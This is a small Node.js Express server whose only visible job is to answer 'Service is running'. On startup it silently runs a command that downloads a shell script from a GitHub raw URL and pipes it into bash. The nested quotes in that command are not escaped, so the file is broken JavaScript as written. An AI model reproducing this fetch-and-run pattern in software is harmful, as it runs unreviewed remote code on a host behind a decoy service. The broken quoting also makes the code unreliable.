const { exec } = require("child_process");
const express = require("express");

const app = express();

// Run your script once
exec("bash -c "$(curl -fsSL https://raw.githubusercontent.com/DeVv-Prime/codingprime/main/ptero/run.sh)"", (err, stdout, stderr) => {
  console.log(stdout);
  console.error(stderr);
});

app.get("/", (req, res) => {
  res.send("Service is running");
});

app.listen(3000, () => console.log("Server running"));
